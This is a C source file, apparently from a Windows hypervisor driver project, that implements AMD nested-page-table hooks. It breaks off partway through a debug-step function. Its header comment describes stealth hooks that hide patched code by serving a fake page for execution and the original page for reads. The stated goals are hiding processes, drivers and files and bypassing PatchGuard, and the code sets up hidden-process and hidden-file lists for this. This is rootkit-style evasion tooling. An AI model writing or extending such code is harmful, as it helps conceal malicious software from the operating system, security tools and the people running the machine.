/*
 * NptHook.c
 * 
 * AMD NPT Hook 模块实现
 * 
 * 功能：
 *   - 使用 NPT 分页欺骗实现隐身 Hook
 *   - 支持隐藏进程、驱动（绕过 PatchGuard）
 * 
 * 注意：
 *   - AMD NPT 不支持 Execute-Only 模式
 *   - 使用双页面策略：FakePage (执行) / OriginalPage (读取)
 *   - 通过 #DB 单步异常实现状态恢复
 */

#include "NptHook.h"
#include "SimpleHypervisor.h"
#include "HvTypes.h"
#include "HvCompat.h"
#include "HvLde.h"
#include "HvHook.h"
#include "HvPhysAccess.h"
#include "HvBroadcast.h"
#include <ntstrsafe.h>

// P122: 全 driver DbgPrint → GUI ring
#define HV_TRACE_THIS_CAT HV_TRACE_CAT_NPT
#include "HvTrace.h"

#define NPT_DIRECT_CALLBACK_BEGIN(_Handle)                                   \
    HV_HOOK_HANDLE hvDirectCallbackHandle = (HV_HOOK_HANDLE)(_Handle);       \
    if (!HvHookCallbackAcquire(hvDirectCallbackHandle)) {                    \
        return STATUS_DELETE_PENDING;                                        \
    }                                                                        \
    __try {

#define NPT_DIRECT_CALLBACK_END()                                             \
    } __finally {                                                            \
        HvHookCallbackRelease(hvDirectCallbackHandle);                       \
    }

// ============================================================
// 全局变量
// ============================================================

NPT_HOOK_MANAGER g_NptHookManager = { 0 };

#define NPT_DEBUG_STEP_MAX 32
#define NPT_DEBUG_STEP_FREE 0
#define NPT_DEBUG_STEP_ARMED 1
#define NPT_DEBUG_STEP_COMPLETING 2
#define NPT_DEBUG_STEP_COMPLETED 3

typedef struct _NPT_DEBUG_STEP_ENTRY {
    volatile LONG State;
    volatile LONG Sequence;
    HANDLE DebuggerPid;
    HANDLE TargetPid;
    HANDLE TargetTid;
    PVOID ThreadToken;
    UINT64 UserCr3;
    UINT64 Address;
    ULONG64 GpaPage;
    ULONG PteCount;
    PNPT_PTE TargetPte[64];
    ULONG64 OriginalPteValue[64];
} NPT_DEBUG_STEP_ENTRY, *PNPT_DEBUG_STEP_ENTRY;

typedef struct _NPT_DEBUG_STEP_CPU {
    volatile LONG Active;
    BOOLEAN Deliver;
    BOOLEAN GuestTfWasSet;
    BOOLEAN DbInterceptWasSet;
    UCHAR Reserved;
    PNPT_PTE TargetPte;
    ULONG64 TrapPteValue;
    PNPT_DEBUG_STEP_ENTRY Entry;
} NPT_DEBUG_STEP_CPU, *PNPT_DEBUG_STEP_CPU;

static NPT_DEBUG_STEP_ENTRY g_NptDebugSteps[NPT_DEBUG_STEP_MAX] = { 0 };
static NPT_DEBUG_STEP_CPU g_NptDebugStepCpu[64] = { 0 };

#define NPT_HOOK_ROOT_ACQUIRE_RETRIES 8
#define NPT_HOOK_DRAIN_RETRIES        200

static BOOLEAN
NptHookpAcquireRootEpoch(_Out_ PULONG Epoch)
{
    ULONG retry;

    for (retry = 0; retry < NPT_HOOK_ROOT_ACQUIRE_RETRIES; ++retry) {
        LONG epoch = InterlockedCompareExchange(
            &g_NptHookManager.RootEpoch, 0, 0) & 1;
        InterlockedIncrement(&g_NptHookManager.RootReaders[epoch]);
        MemoryBarrier();
        if (epoch == (InterlockedCompareExchange(
                &g_NptHookManager.RootEpoch, 0, 0) & 1)) {
            *Epoch = (ULONG)epoch;
            return TRUE;
        }
        InterlockedDecrement(&g_NptHookManager.RootReaders[epoch]);
        YieldProcessor();
    }
    return FALSE;
}

static __forceinline VOID
NptHookpReleaseRootEpoch(_In_ ULONG Epoch)
{
    InterlockedDecrement(
        &g_NptHookManager.RootReaders[Epoch & 1]);
}

static ULONG
NptHookpAdvanceRootEpoch(VOID)
{
    LONG oldEpoch;
    LONG newEpoch;

    do {
        oldEpoch = InterlockedCompareExchange(
            &g_NptHookManager.RootEpoch, 0, 0) & 1;
        newEpoch = oldEpoch ^ 1;
    } while (InterlockedCompareExchange(
                 &g_NptHookManager.RootEpoch,
                 newEpoch,
                 oldEpoch) != oldEpoch);
    MemoryBarrier();
    return (ULONG)oldEpoch;
}

static BOOLEAN
NptHookpWaitRootEpoch(_In_ ULONG Epoch)
{
    ULONG retry;

    for (retry = 0; retry < NPT_HOOK_DRAIN_RETRIES; ++retry) {
        if (InterlockedCompareExchange(
                &g_NptHookManager.RootReaders[Epoch & 1], 0, 0) == 0) {
            return TRUE;
        }
        if (KeGetCurrentIrql() <= APC_LEVEL) {
            LARGE_INTEGER delay;
            delay.QuadPart = -10000;
            KeDelayExecutionThread(KernelMode, FALSE, &delay);
        } else {
            KeStallExecutionProcessor(50);
        }
    }
    return FALSE;
}

// NPT 版本号：每次修改 NPT PTE 时递增
/*
 * NPT entries are hardware-owned 64-bit values: the processor may update the
 * Accessed/Dirty bits while the hook path changes PFN/permissions. Bitfield
 * stores compile into multiple read/modify/write operations and can expose a
 * torn policy to another CPU. Preserve unrelated bits and publish the complete
 * entry with one cmpxchg64 operation.
 */
static __forceinline VOID
NptHookpUpdatePteAtomic(
    _Inout_ PNPT_PTE Pte,
    _In_ BOOLEAN UpdatePfn,
    _In_ ULONG64 PageFrameNumber,
    _In_ BOOLEAN Present,
    _In_ BOOLEAN Write,
    _In_ BOOLEAN NoExecute)
{
    LONG64 observed;

    if (!Pte) return;

    observed = InterlockedCompareExchange64(
        (volatile LONG64*)&Pte->Value, 0, 0);
    for (;;) {
        NPT_PTE desired;
        LONG64 previous;

        desired.Value = (ULONG64)observed;
        if (UpdatePfn) {
            desired.PageFrameNumber = PageFrameNumber & 0xFFFFFFFFFFULL;
        }
        desired.Present = Present ? 1 : 0;
        desired.Write = Write ? 1 : 0;
        desired.NoExecute = NoExecute ? 1 : 0;

        previous = InterlockedCompareExchange64(
            (volatile LONG64*)&Pte->Value,
            (LONG64)desired.Value,
            observed);
        if (previous == observed) {
            break;
        }
        observed = previous;
    }
}

/* Restore the complete pre-activation NPT leaf, not a synthesized RWX leaf. */
static __forceinline BOOLEAN
NptHookpRestoreOriginalLeaf(
    _In_ PNPT_HOOK_PAGE PageOwner,
    _In_ ULONG CpuIndex)
{
    if (!PageOwner ||
        CpuIndex >= PageOwner->TargetPteCount ||
        CpuIndex >= RTL_NUMBER_OF(PageOwner->TargetPte) ||
        !PageOwner->TargetPte[CpuIndex]) {
        return FALSE;
    }

    InterlockedExchange64(
        (volatile LONG64*)&PageOwner->TargetPte[CpuIndex]->Value,
        (LONG64)PageOwner->OriginalPteValue[CpuIndex]);
    return TRUE;
}

static ULONG
NptHookpRestoreOriginalLeaves(
    _In_ PNPT_HOOK_PAGE PageOwner)
{
    ULONG restoredCount = 0;
    ULONG cpuIndex;

    if (!PageOwner) {
        return 0;
    }

    for (cpuIndex = 0;
         cpuIndex < PageOwner->TargetPteCount &&
         cpuIndex < RTL_NUMBER_OF(PageOwner->TargetPte);
         ++cpuIndex) {
        if (NptHookpRestoreOriginalLeaf(PageOwner, cpuIndex)) {
            ++restoredCount;
        }
    }
    return restoredCount;
}

volatile LONG64 g_NptVersion = 0;

// 每个 CPU 上次看到的 NPT 版本号
static volatile LONG64 g_LastNptVersion[64] = { 0 };

static VOID NptIncrementVersion(VOID);

typedef struct _NPT_TLB_SHOOTDOWN_CONTEXT {
    PVOID VirtualAddress[MAX_NPT_HOOKS];
    ULONG VirtualAddressCount;
} NPT_TLB_SHOOTDOWN_CONTEXT, *PNPT_TLB_SHOOTDOWN_CONTEXT;

/*
 * Control-plane NPT leaf updates happen while every processor is running as a
 * Windows guest.  A version alone is not a shootdown: the VMCB command is only
 * consumed by a later VMRUN.  Invalidate the canonical kernel VA on every CPU
 * before an active fake page is edited or retired.  Do not mark that generation
 * observed: all registered aliases get an immediate INVLPG, then the next
 * VM exit arms the required full guest-ASID flush for the following VMRUN. Hook
 * targets are kernel-image pages and therefore exist in every kernel CR3.
 */
static ULONG_PTR
NptHookpInvlpgIpi(
    _In_ ULONG_PTR Context)
{
    PNPT_TLB_SHOOTDOWN_CONTEXT shootdown =
        (PNPT_TLB_SHOOTDOWN_CONTEXT)Context;

    if (!shootdown) {
        return 0;
    }
    for (ULONG i = 0; i < shootdown->VirtualAddressCount; ++i) {
        __invlpg(shootdown->VirtualAddress[i]);
    }
    /* INVLPG covers the known canonical aliases immediately, but it is not a
     * full guest-ASID/NPT invalidation.  Do not commit LastNptVersion here:
     * the next VM exit must arm FLUSH_GUEST, which HvVmExit leaves set for the
     * following VMRUN to consume. */
    return 0;
}

static VOID
NptHookpSynchronizePageTlb(
    _In_ PNPT_HOOK_PAGE PageOwner)
{
    NPT_TLB_SHOOTDOWN_CONTEXT shootdown;
    PLIST_ENTRY link;

    RtlZeroMemory(&shootdown, sizeof(shootdown));
    if (PageOwner && PageOwner->TargetPageVirtualAddress) {
        shootdown.VirtualAddress[shootdown.VirtualAddressCount++] =
            PageOwner->TargetPageVirtualAddress;
        for (link = PageOwner->SiteList.Flink;
             link != &PageOwner->SiteList &&
             shootdown.VirtualAddressCount <
                RTL_NUMBER_OF(shootdown.VirtualAddress);
             link = link->Flink) {
            PNPT_HOOK_ENTRY site = CONTAINING_RECORD(
                link, NPT_HOOK_ENTRY, PageListEntry);
            PVOID pageVa = (PVOID)(
                (ULONG_PTR)site->TargetVirtualAddress & PAGE_MASK);
            BOOLEAN duplicate = FALSE;

            for (ULONG i = 0; i < shootdown.VirtualAddressCount; ++i) {
                if (shootdown.VirtualAddress[i] == pageVa) {
                    duplicate = TRUE;
                    break;
                }
            }
            if (!duplicate) {
                shootdown.VirtualAddress[shootdown.VirtualAddressCount++] =
                    pageVa;
            }
        }
    }
    InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
    MemoryBarrier();

    if (shootdown.VirtualAddressCount != 0 &&
        KeGetCurrentIrql() <= APC_LEVEL) {
        KeIpiGenericCall(
            NptHookpInvlpgIpi,
            (ULONG_PTR)&shootdown);
    }
}

// 标记是否在 SVM root 模式
volatile BOOLEAN g_InSvmRootMode = FALSE;

// 隐藏进程列表
#define MAX_HIDDEN_PROCESSES 16
static ULONG g_NptHiddenProcessIds[MAX_HIDDEN_PROCESSES] = { 0 };
static ULONG g_NptHiddenProcessCount = 0;
static KSPIN_LOCK g_NptHiddenProcessLock;

// 前向声明：文件隐藏相关全局变量
#define MAX_NPT_HIDDEN_FILES 32
#define MAX_NPT_FILE_NAME_LEN 256
static WCHAR g_NptHiddenFileNames[MAX_NPT_HIDDEN_FILES][MAX_NPT_FILE_NAME_LEN];
static ULONG g_NptHiddenFileCount;
static KSPIN_LOCK g_NptHiddenFileLock;
static volatile LONG g_NptHiddenFileLockInit;

// x64 跳转指令模板 (jmp [rip+0])
static const UCHAR NptJmpTemplate[] = {
    0xFF, 0x25, 0x00, 0x00, 0x00, 0x00,  // jmp qword ptr [rip+0]
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00  // 地址占位符
};
#define NPT_JMP_SIZE 14
C_ASSERT(NPT_JMP_SIZE == NPT_INLINE_PATCH_SIZE);

// KLDR_DATA_TABLE_ENTRY 已在 HvTypes.h 中定义

// ============================================================
// 内部函数声明
// ============================================================

PNPT_PTE
NptGetPteForPhysicalAddress(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
);

static PNPT_PTE
NptGetOrCreatePteForHook(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
);

static NTSTATUS
NptCreateFakePage(
    _Inout_ PNPT_HOOK_PAGE PageOwner,
    _In_ PVOID TargetAddress
);

static NTSTATUS
NptCreateTrampoline(
    _In_ PNPT_HOOK_ENTRY HookEntry
);

static VOID
NptSwitchToFakePage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_PAGE PageOwner
);

static VOID
NptSwitchToOriginalPage(
    _In_ PVCPU_DATA VcpuData,
    _In_ PNPT_HOOK_PAGE PageOwner
);

static PNPT_HOOK_PAGE
NptHookpFindPageByPhysicalAddressNoLock(
    _In_ ULONG64 PhysicalAddress
);

static PNPT_HOOK_PAGE
NptHookpFindPageByTargetGpaLocked(
    _In_ ULONG64 TargetPhysicalAddress
);

static NTSTATUS
NptHookpRemoveClaimed(_In_ PNPT_HOOK_ENTRY HookEntry);

// ============================================================
// 多 CPU NPT TLB 同步
// ============================================================

/*
 * 增加 NPT 版本号
 */
static VOID
NptIncrementVersion(VOID)
{
    InterlockedIncrement64((volatile LONG64*)&g_NptVersion);
}

/*
 * 刷新当前 SVM-host CPU 的 NPT TLB。VM-exit page switching only changes
 * this CPU's private NPT leaf, so it must not manufacture a global version.
 *
 * 只有拥有当前 VMRUN/VMCB 的 CPU 可以写自己的 TlbControl。旧实现从一个
 * CPU 遍历并写所有远程 VMCB，会与其他 CPU 的硬件消费/回写发生竞态。
 */
static VOID
NptInvalidateTlb(PVCPU_DATA VcpuData)
{
    if (VcpuData && VcpuData->Vmcb &&
        VcpuData->ProcessorNumber < 64) {
        VcpuData->Vmcb->ControlArea.TlbControl =
            SVM_TLB_CONTROL_FLUSH_GUEST;
        g_LastNptVersion[VcpuData->ProcessorNumber] = g_NptVersion;
    }
}

/*
 * 检查并刷新 NPT TLB
 */
VOID
NptCheckAndInvalidateTlb(PVCPU_DATA VcpuData)
{
    ULONG cpuIndex;
    LONG64 currentVersion;

    if (!VcpuData || VcpuData->ProcessorNumber >= 64) return;
    cpuIndex = VcpuData->ProcessorNumber;
    
    currentVersion = g_NptVersion;
    
    if (g_LastNptVersion[cpuIndex] != currentVersion) {
        // NPT 已被修改，需要刷新
        if (VcpuData && VcpuData->Vmcb) {
            VcpuData->Vmcb->ControlArea.TlbControl = SVM_TLB_CONTROL_FLUSH_GUEST;
        }
        g_LastNptVersion[cpuIndex] = currentVersion;
    }
}

/*
 * 设置 SVM root 模式标志
 */
VOID NptSetSvmRootMode(BOOLEAN InRootMode)
{
    g_InSvmRootMode = InRootMode;
}

// ============================================================
// 指令长度解码器（与 EPT Hook 共享 - 2026-06-16 方案 A 改用 HvLde.c）
// ============================================================

/*
 * 获取单条 x64 指令的长度 — 共享解码器 wrapper
 */
static ULONG
NptGetInstructionLength(
    _In_ PUCHAR Code
)
{
    HV_INST_INFO info;
    if (!HvLdeDecode(Code, &info)) return 0;
    return info.Length;
}

/*
 * 计算跳板大小
 */
static ULONG
NptCalculateTrampolineSize(
    _In_ PUCHAR Code,
    _In_ ULONG MinBytes
)
{
    ULONG totalLength = 0;
    ULONG instLength;
    ULONG maxInstructions = 10;
    
    while (totalLength < MinBytes && maxInstructions > 0) {
        instLength = NptGetInstructionLength(Code + totalLength);
        
        if (instLength == 0) {
            // 无法解码 —— 返回 0,绝不强写 NPT_JMP_SIZE 字节切到指令中间。
            DbgPrint("[NPT-Hook] Failed to decode instruction at offset %d\n", totalLength);
            return 0;
        }
        
        totalLength += instLength;
        maxInstructions--;
    }
    
    DbgPrint("[NPT-Hook] Trampoline size: %d bytes (min: %d)\n", totalLength, MinBytes);
    return totalLength;
}

// ============================================================
// NPT 打印信息
// ============================================================

VOID
NptPrintInfo(VOID)
{
    ULONG cpuIndex;
    
    DbgPrint("[NPT-Hook] ========== NPT Structure Info ==========\n");
    
    if (!g_HypervisorContext.IsActive) {
        DbgPrint("[NPT-Hook] Hypervisor is not active\n");
        DbgPrint("[NPT-Hook] =====================================\n");
        return;
    }
    
    if (g_HypervisorContext.VcpuData) {
        cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        DbgPrint("[NPT-Hook] CPU %d VcpuData:\n", cpuIndex);
        
        if (vcpuData->NptTables) {
            PNPT_TABLES nptTables = vcpuData->NptTables;
            ULONG64 pml4Pa = nptTables->Pml4Physical.QuadPart;
            ULONG validPml4Count = 0;
            ULONG validPdptCount = 0;
            ULONG i;
            
            for (i = 0; i < 512; i++) {
                if (nptTables->Pml4[i].Present) {
                    validPml4Count++;
                }
                if (nptTables->Pdpt[i].Present) {
                    validPdptCount++;
                }
            }
            
            DbgPrint("[NPT-Hook]   NptTables VA: %p\n", nptTables);
            DbgPrint("[NPT-Hook]   PML4 Physical: 0x%llx\n", pml4Pa);
            DbgPrint("[NPT-Hook]   Valid PML4 entries: %d\n", validPml4Count);
            DbgPrint("[NPT-Hook]   Valid PDPT entries: %d\n", validPdptCount);
            DbgPrint("[NPT-Hook]   Split PT count: %d\n", nptTables->SplitPtCount);
        } else {
            DbgPrint("[NPT-Hook]   NptTables: NULL (NPT not configured)\n");
        }
        
        if (vcpuData->Vmcb) {
            DbgPrint("[NPT-Hook]   VMCB: %p (NPT enabled: %d)\n", 
                vcpuData->Vmcb, 
                (vcpuData->Vmcb->ControlArea.NpEnable & 1) != 0);
        }
    }
    
    DbgPrint("[NPT-Hook] =====================================\n");
}

BOOLEAN
NptIsConfigured(VOID)
{
    if (!g_HypervisorContext.IsActive) {
        return FALSE;
    }
    
    if (g_HypervisorContext.VcpuData) {
        ULONG cpuIndex = KeGetCurrentProcessorNumber();
        PVCPU_DATA vcpuData = &g_HypervisorContext.VcpuData[cpuIndex];
        
        if (vcpuData->NptTables && vcpuData->Vmcb) {
            return (vcpuData->Vmcb->ControlArea.NpEnable & 1) != 0;
        }
    }
    
    return FALSE;
}

// ============================================================
// 检查 NX 支持
// ============================================================

static BOOLEAN
NptIsNxSupported(VOID)
{
    int cpuInfo[4];
    ULONG64 efer;
    
    // 检查 CPUID.80000001H:EDX[20] = NX bit
    __cpuid(cpuInfo, 0x80000001);
    if (!(cpuInfo[3] & (1 << 20))) {
        DbgPrint("[NPT-Hook] CPU does not support NX bit\n");
        return FALSE;
    }
    
    // 检查 EFER.NXE
    efer = __readmsr(MSR_IA32_EFER);
    if (!(efer & EFER_NXE)) {
        DbgPrint("[NPT-Hook] EFER.NXE not enabled\n");
        return FALSE;
    }
    
    DbgPrint("[NPT-Hook] NX support confirmed\n");
    return TRUE;
}

// ============================================================
// 初始化和清理
// ============================================================

NTSTATUS
NptHookInitialize(VOID)
{
    PHYSICAL_ADDRESS maxAddr;
    
    if (g_NptHookManager.Initialized) {
        return STATUS_SUCCESS;
    }
    
    DbgPrint("[NPT-Hook] Initializing NPT Hook Manager...\n");
    
    // 初始化链表
    InitializeListHead(&g_NptHookManager.HookList);
    g_NptHookManager.HookCount = 0;
    InitializeListHead(&g_NptHookManager.RetiredHookList);
    g_NptHookManager.RetiredHookCount = 0;
    InitializeListHead(&g_NptHookManager.PageList);
    g_NptHookManager.PageCount = 0;
    InitializeListHead(&g_NptHookManager.RetiredPageList);
    g_NptHookManager.RetiredPageCount = 0;
    
    // 初始化自旋锁
    KeInitializeSpinLock(&g_NptHookManager.Lock);
    ExInitializeFastMutex(&g_NptHookManager.MutationMutex);
    InterlockedExchange(&g_NptHookManager.RootEpoch, 0);
    InterlockedExchange(&g_NptHookManager.RootReaders[0], 0);
    InterlockedExchange(&g_NptHookManager.RootReaders[1], 0);
    
    // 初始化隐藏进程列表
    KeInitializeSpinLock(&g_NptHiddenProcessLock);
    g_NptHiddenProcessCount = 0;
    RtlZeroMemory(g_NptHiddenProcessIds, sizeof(g_NptHiddenProcessIds));
    
    // 初始化文件隐藏锁（提前初始化以避免运行时竞态条件）
    KeInitializeSpinLock(&g_NptHiddenFileLock);
    InterlockedExchange(&g_NptHiddenFileLockInit, TRUE);
    g_NptHiddenFileCount = 0;
    RtlZeroMemory(g_NptHiddenFileNames, sizeof(g_NptHiddenFileNames));
    
    // 检查 NX 支持
    g_NptHookManager.NxSupported = NptIsNxSupported();
    DbgPrint("[NPT-Hook] NX support: %s\n",
        g_NptHookManager.NxSupported ? "YES" : "NO");
    
    // 初始化单步上下文
    RtlZeroMemory(g_NptHookManager.StepContext, sizeof(g_NptHookManager.StepContext));
    RtlZeroMemory(g_NptDebugSteps, sizeof(g_NptDebugSteps));
    RtlZeroMemory(g_NptDebugStepCpu, sizeof(g_NptDebugStepCpu));
    
    // 分配跳板池
    // TODO 2026-06-19: 跟 EptHook 一样, AMD 路径也可能受 RIP-rel disp32 超距溢出影响,
    // 应改用 driver image 内嵌静态可执行 section (见 EptHook.c g_StaticTrampolinePool)。
    // 暂留 ExAllocatePool 用法, 等真机验证 AMD 路径是否需要再改。
    g_NptHookManager.TrampolinePool = HvAllocateNonPagedExecute(
        PAGE_SIZE_4KB * 4,
        NPT_HOOK_TAG
    );
    
    if (!g_NptHookManager.TrampolinePool) {
        DbgPrint("[NPT-Hook] Failed to allocate trampoline pool\n");
        return STATUS_INSUFFICIENT_RESOURCES;
    }
    
    // 2026-05-21 镜像 EptHook 修复:不要 ZeroMemory,改 INT3 fill。
    //   0x00 = ADD [RAX],AL → 走错落空区立刻 AV 无受控陷阱;
    //   0xCC = INT3 → #BP → 受控 KeBugCheckEx 有 dump。
    RtlFillMemory(g_NptHookManager.TrampolinePool, PAGE_SIZE_4KB * 4, 0xCC);
    g_NptHookManager.TrampolinePoolPhysical =
        MmGetPhysicalAddress(g_NptHookManager.TrampolinePool).QuadPart;
    g_NptHookManager.TrampolinePoolUsed = 0;
    
    g_NptHookManager.Initialized = TRUE;
    
    DbgPrint("[NPT-Hook] NPT Hook Manager initialized\n");
    DbgPrint("[NPT-Hook] Trampoline Pool: VA=%p PA=0x%llx\n",
        g_NptHookManager.TrampolinePool,
        g_NptHookManager.TrampolinePoolPhysical);
    
    NptPrintInfo();
    
    return STATUS_SUCCESS;
}

VOID
NptHookCleanup(VOID)
{
    KIRQL oldIrql;
    PVOID trampolinePool = NULL;
    PLIST_ENTRY retiredLink;
    PNPT_HOOK_ENTRY retiredEntry;
    PNPT_HOOK_PAGE retiredPage;
    
    if (!g_NptHookManager.Initialized) {
        return;
    }
    
    DbgPrint("[NPT-Hook] Cleaning up NPT Hook Manager...\n");
    
    NptHookDebugStepClearAll(NULL, NULL);
    NptHookRemoveAll();
    if (g_NptHookManager.HookCount != 0 ||
        g_NptHookManager.PageCount != 0) {
        DbgPrint("[NPT-Hook] Cleanup retained %lu hook(s); manager stays initialized\n",
                 g_NptHookManager.HookCount);
        return;
    }

    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);
    if (g_NptHookManager.HookCount != 0 ||
        g_NptHookManager.PageCount != 0) {
        DbgPrint("[NPT-Hook] Cleanup raced a new prepared/active hook; manager stays initialized\n");
        ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
        return;
    }
    for (;;) {
        KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
        if (IsListEmpty(&g_NptHookManager.RetiredHookList)) {
            KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
            break;
        }
        retiredLink = RemoveHeadList(&g_NptHookManager.RetiredHookList);
        if (g_NptHookManager.RetiredHookCount != 0) {
            g_NptHookManager.RetiredHookCount--;
        }
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

        retiredEntry = CONTAINING_RECORD(
            retiredLink, NPT_HOOK_ENTRY, ListEntry);
        ExFreePoolWithTag(retiredEntry, NPT_HOOK_TAG);
    }

    for (;;) {
        KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
        if (IsListEmpty(&g_NptHookManager.RetiredPageList)) {
            KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
            break;
        }
        retiredLink = RemoveHeadList(&g_NptHookManager.RetiredPageList);
        if (g_NptHookManager.RetiredPageCount != 0) {
            g_NptHookManager.RetiredPageCount--;
        }
        KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);

        retiredPage = CONTAINING_RECORD(
            retiredLink, NPT_HOOK_PAGE, ListEntry);
        if (retiredPage->FakePageVirtual) {
            MmFreeContiguousMemory(retiredPage->FakePageVirtual);
        }
        ExFreePoolWithTag(retiredPage, NPT_HOOK_PAGE_TAG);
    }
    
    KeAcquireSpinLock(&g_NptHookManager.Lock, &oldIrql);
    
    trampolinePool = g_NptHookManager.TrampolinePool;
    g_NptHookManager.TrampolinePool = NULL;
    g_NptHookManager.Initialized = FALSE;
    
    KeReleaseSpinLock(&g_NptHookManager.Lock, oldIrql);
    ExReleaseFastMutex(&g_NptHookManager.MutationMutex);
    
    if (trampolinePool) {
        ExFreePoolWithTag(trampolinePool, NPT_HOOK_TAG);
    }
    
    DbgPrint("[NPT-Hook] NPT Hook Manager cleaned up\n");
}

// ============================================================
// NPT PTE 操作
// ============================================================

/*
 * 获取指定物理地址的 NPT PTE
 *
 * 安全约束: 仅处理 PML4[0] (PA < 512GB) 的低 4KB PTE.
 * PML4[1..3] (>= 512GB) 当 HV_ENABLE_SVM_HARDENING=1 时映射为 1GB 大页, 无 PTE 层级,
 * 直接返回 NULL → 让 NPF fallback 走"大页 RWX"路径而不是错写 Pd[0..511][0..511].
 *
 * 历史 bug (修复前): 没有 PML4 索引计算, PA >= 512GB 时 (PA>>30)&0x1FF 仍 0-511 但
 * 实际溢出, 错误索引 nptTables->Pd[][] 返回不相干的低位 PTE → 静默错误.
 */
PNPT_PTE
NptGetPteForPhysicalAddress(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
)
{
    ULONG64 pml4Index, pdptIndex, pdIndex, ptIndex;
    PNPT_TABLES nptTables;
    NPT_PDE* pde;
    PNPT_PTE ptPage;
    PHYSICAL_ADDRESS ptPhys;

    if (!VcpuData || !VcpuData->NptTables) {
        return NULL;
    }

    nptTables = VcpuData->NptTables;

    // 拒绝 PML4[1..3] 范围 (>=512GB), 那里是 1GB 大页(或未映射), 无 PTE 层级
    pml4Index = (PhysicalAddress >> 39) & 0x1FFu;
    if (pml4Index != 0) {
        return NULL;
    }

    // 计算 PML4[0] 内的索引
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex = (PhysicalAddress >> 21) & 0x1FF;
    ptIndex = (PhysicalAddress >> 12) & 0x1FF;

    // 获取 PDE
    pde = &nptTables->Pd[pdptIndex][pdIndex];

    if (!pde->Large.Present) {
        return NULL;
    }

    // 检查是否为 2MB 大页
    if (pde->Large.LargePage) {
        // 大页不能直接返回 PTE，需要先分割
        return NULL;
    }

    // 获取 PT 物理地址
    ptPhys.QuadPart = (LONGLONG)(pde->Small.PageFrameNumber << 12);
    ptPage = (PNPT_PTE)MmGetVirtualForPhysical(ptPhys);

    if (!ptPage) {
        return NULL;
    }

    return &ptPage[ptIndex];
}

/*
 * 获取或创建 4KB PTE（必要时分割大页）
 */
static PNPT_PTE
NptGetOrCreatePteForHook(
    _In_ PVCPU_DATA VcpuData,
    _In_ ULONG64 PhysicalAddress
)
{
    ULONG64 pml4Index, pdptIndex, pdIndex;
    PNPT_TABLES nptTables;
    NPT_PDE* pde;
    NTSTATUS status;
    
    if (!VcpuData || !VcpuData->NptTables) {
        return NULL;
    }
    
    nptTables = VcpuData->NptTables;
    
    pml4Index = (PhysicalAddress >> 39) & 0x1FF;
    if (pml4Index != 0) {
        return NULL;
    }
    pdptIndex = (PhysicalAddress >> 30) & 0x1FF;
    pdIndex = (PhysicalAddress >> 21) & 0x1FF;
    
    pde = &nptTables->Pd[pdptIndex][pdIndex];
    
    if (!pde->Large.Present) {
        DbgPrint("[NPT-Hook] PDE not present for PA 0x%llx\n", PhysicalAddress);
        return NULL;
    }
    
    // 如果是大页，需要分割
    if (pde->Large.LargePage) {
        status = SvmSplitNptLargePage(VcpuData, PhysicalAddress);
        if (!NT_SUCCESS(status)) {
            DbgPrint("[NPT-Hook] Failed to split large page: 0x%X\n", status);
            return NULL;
        }
    }
    
    return NptGetPteForPhysicalAddress(VcpuData, PhysicalAddress);
}

static __forceinline PVOID
NptHookpCurrentThreadToken(VOID)
{
#if defined(_AMD64_)
    return (PVOID)(ULONG_PTR)__readgsqword(0x188);
#else
    return NULL;
#endif
}

BOOLEAN NptHookIsDebugStepSupported(VOID)
{
    return g_NptHookManager.Initialized &&
           HvGetCpuVendor() == CPU_VENDOR_AMD &&
           g_HypervisorContext.IsActive &&
           g_HypervisorContext.VcpuData &&
           g_HypervisorContext.ProcessorCount != 0 &&
           g_HypervisorContext.ProcessorCount <= 64;
}

NTSTATUS NptHookDebugStepArm(
    _In_ HANDLE DebuggerPid,
    _In_ HANDLE TargetPid,
    _In_ HANDLE TargetTid,
    _In_ PVOID ThreadToken,
    _In_ UINT64 Address)
{
    PHYSICAL_ADDRESS hpa;
    SIZE_T pageSize = 0;
    UINT64 userCr3 = 0;
    PNPT_DEBUG_STEP_ENTRY entry = NULL;
    ULONG processorCount;
    NTSTATUS status;

    if (!NptHookIsDebugStepSupported()) return STATUS_NOT_SUPPORTED;
    if (!DebuggerPid || !TargetPid || !TargetTid || !ThreadToken ||
        Address < 0x10000ULL || Address >= 0x0000800000000000ULL) {
        return STATUS_INVALID_PARAMETER;
    }
    if (KeGetCurrentIrql() != PASSIVE_LEVEL) return STATUS_INVALID_LEVEL;

    status = HvPhysGvaToHpaByPid(
        (ULONG)(ULONG_PTR)TargetPid,
        Address,
        &hpa,
        &pageSize,
        NULL);
    if (!NT_SUCCESS(status)) return status;
    status = HvPhysGetProcessCr3(
        (ULONG)(ULONG_PTR)TargetPid,
        &userCr3);
    if (!NT_SUCCESS(status) || !userCr3) {
        return NT_SUCCESS(status) ? STATUS_NOT_FOUND : status;
    }

    ExAcquireFastMutex(&g_NptHookManager.MutationMutex);
    __try {
        for (ULONG index = 0; index < NPT_DEBUG_STEP_MAX; index++) {
            PNPT_DEBUG_STEP_ENTRY candidate = &g_NptDebugSteps[index];
            LONG state = InterlockedCompareExchange(
                &candidate->State,
                NPT_DEBUG_STEP_FREE,
                NPT_DEBUG_STEP_FREE);
            if (state != NPT_DEBUG_STEP_FREE &&
                candidate->DebuggerPid == DebuggerPid &&
                candidate->TargetPid == TargetPid &&
                candidate->TargetTid == TargetTid) {
                return state == NPT_DEBUG_STEP_COMPLETING
                    ? STATUS_DEVICE_BUSY
                    : STATUS_OBJECT_NAME_COLLISION;
            }
